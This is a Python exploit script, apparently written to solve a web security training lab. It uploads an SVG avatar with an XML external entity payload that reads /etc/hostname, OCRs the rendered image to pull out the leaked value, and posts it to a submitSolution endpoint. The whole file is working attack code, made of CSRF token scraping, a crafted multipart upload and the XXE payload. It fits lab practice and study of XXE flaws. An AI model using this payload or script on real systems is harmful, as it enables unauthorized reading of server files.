import time
import requests
import sys
import re
from PIL import Image
import pytesseract
from io import BytesIO

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <url>")
        sys.exit(1)

    url = sys.argv[1]

    response = requests.get(f"{url}/post?postId=3")

    csrf_token_search = re.search(r'<input required type="hidden" name="csrf" value="(.*?)">', response.text)

    if not csrf_token_search:
        print("CSRF token not found")
        sys.exit(1)

    csrf_token = csrf_token_search.group(1)

    cookies = response.cookies.get_dict()

    burp0_url = url
    burp0_cookies = cookies
    burp0_headers = {
        "Content-Type": "multipart/form-data; boundary=---------------------------3148732646408831803750288201"
    }
    burp0_data = (
        "\r\n-----------------------------3148732646408831803750288201\r\n"
        "Content-Disposition: form-data; name=\"csrf\"\r\n\r\n"
        f"{csrf_token}\r\n"
        "-----------------------------3148732646408831803750288201\r\n"
        "Content-Disposition: form-data; name=\"postId\"\r\n\r\n"
        "3\r\n"
        "-----------------------------3148732646408831803750288201\r\n"
        "Content-Disposition: form-data; name=\"comment\"\r\n\r\n"
        "1\r\n"
        "-----------------------------3148732646408831803750288201\r\n"
        "Content-Disposition: form-data; name=\"name\"\r\n\r\n"
        "1\r\n"
        "-----------------------------3148732646408831803750288201\r\n"
        "Content-Disposition: form-data; name=\"avatar\"; filename=\"a.svg\"\r\n"
        "Content-Type: text/plain\r\n\r\n"
        "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]>"
        "<svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\">"
        "<text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text></svg>\r\n"
        "-----------------------------3148732646408831803750288201\r\n"
        "Content-Disposition: form-data; name=\"email\"\r\n\r\n"
        "1@1.com\r\n"
        "-----------------------------3148732646408831803750288201\r\n"
        "Content-Disposition: form-data; name=\"website\"\r\n\r\n\r\n"
        "-----------------------------3148732646408831803750288201--\r\n"
    )

    upload_url = burp0_url + '/post/comment'
    response = requests.post(upload_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

    # Pobierz obrazek z endpointu
    avatar_response = requests.get(f"{url}/post/comment/avatars?filename=1.png")
    image = Image.open(BytesIO(avatar_response.content))
    text = pytesseract.image_to_string(image)
    print(text)

burp_url_answer = sys.argv[1]+'/submitSolution'
burp_headers_answer = {}
burp_data_answer = {"answer": text[:-1]}
r = requests.post(burp_url_answer, headers=burp_headers_answer, data=burp_data_answer)
print(r.text)
